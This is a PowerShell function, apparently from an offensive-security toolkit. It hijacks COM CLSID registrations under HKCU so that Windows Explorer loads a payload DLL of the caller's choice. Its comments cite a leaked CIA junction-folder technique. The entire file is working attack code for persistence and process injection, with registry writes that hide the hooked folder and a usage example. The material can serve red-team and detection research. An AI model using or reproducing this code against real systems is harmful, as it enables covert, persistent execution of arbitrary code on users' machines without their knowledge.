function Hook-InProcServer {
<#
.SYNOPSIS
	Hook "NAME NOT FOUND" InProcServer32 references in HKCU and inject a payload DLL into explorer.

	This is based on leaked CIA junction folders technique.

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER CLSID
	COM CLSID.

.PARAMETER Path
	Path to payload, extension does not matter.

.EXAMPLE
	C:\PS> Hook-InProcServer -CLSID db47f3b5-6c5d-4345-a6bc-2b60e92976d1 -Path C:\Some\Path.payload
#>

	param(
		[Parameter(Mandatory = $True)]
		[String]$CLSID,
		[Parameter(Mandatory = $True)]
		[String]$Path
	)

	New-Item -Path "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue | Out-Null
	New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}" | Out-Null
	New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" | Out-Null
	New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" | Out-Null
	New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "(default)" -Value $Path | Out-Null
	New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "ThreadingModel" -Value "Apartment" | Out-Null
	New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "LoadWithoutCOM" -Value "" | Out-Null
	New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "HideOnDesktop" -Value "" | Out-Null
	New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "Attributes" -Value 0xf090013d -PropertyType DWORD | Out-Null
}